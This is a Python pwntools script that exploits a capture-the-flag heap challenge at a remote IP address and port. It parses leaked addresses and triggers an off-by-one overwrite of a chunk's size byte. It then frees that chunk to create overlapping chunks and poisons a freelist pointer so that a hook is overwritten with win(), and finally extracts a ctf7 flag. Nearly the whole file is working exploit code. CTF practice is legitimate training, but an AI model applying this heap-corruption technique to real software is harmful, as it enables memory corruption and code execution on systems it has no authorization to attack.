#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

# Get addresses
banner = io.recvuntil(b'>')
print(banner.decode())

import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:016x}")
print(f"[+] win(): 0x{win:016x}")
print(f"[+] hook: 0x{hook:016x}")

# Let's try the simplest possible exploit:
# Create a note, overflow it to overwrite the hook directly

# The heap is at a runtime address, hook is at fixed .bss
# We can't directly overflow from heap to .bss

# Instead, let's use the off-by-one to corrupt heap metadata
# and use tcache/fastbin attack

# Create 3 notes of size 0x20
print("\n[*] Creating notes...")
io.sendline(b'1')
io.sendlineafter(b':', b'24')  # Size 24 -> chunk size 0x20
io.sendlineafter(b':', b'AAAA')
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'BBBB')
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'CCCC')
io.recvuntil(b'>')

# Edit note 0 - append exactly 1 byte (off-by-one)
print("[*] Triggering off-by-one...")
io.sendline(b'2')
io.sendlineafter(b':', b'0')
# Append 1 byte to overwrite next chunk's size LSB
io.sendlineafter(b':', b'\x91')  # Change size from 0x21 to 0x91
io.recvuntil(b'>')

# Delete note 1 (now thinks it's size 0x91)
print("[*] Freeing corrupted chunk...")
io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Allocate smaller chunk - creates overlap
print("[*] Creating overlap...")
io.sendline(b'1')
io.sendlineafter(b':', b'16')
# This chunk overlaps with note 2
# Write fd pointer to point to hook-0x10
payload = p64(0) + p64(hook - 0x10)
io.sendlineafter(b':', payload)
io.recvuntil(b'>')

# Allocate again
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'DDDD')
io.recvuntil(b'>')

# Next allocation should be near hook
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', p64(win) * 3)  # Write win() address
io.recvuntil(b'>')

# Trigger by deleting
print("[*] Triggering hook...")
io.sendline(b'3')
io.sendlineafter(b':', b'0')

# Get all output
print("\n[*] Getting output...")
try:
    output = io.recvall(timeout=3)
    print("="*60)
    print(output.decode(errors='ignore'))
    print("="*60)
    
    if b'ctf7{' in output:
        flag = re.search(rb'ctf7\{[^}]+\}', output)
        if flag:
            print(f"\n[+] FLAG: {flag.group(0).decode()}")
except Exception as e:
    print(f"Error: {e}")

io.close()
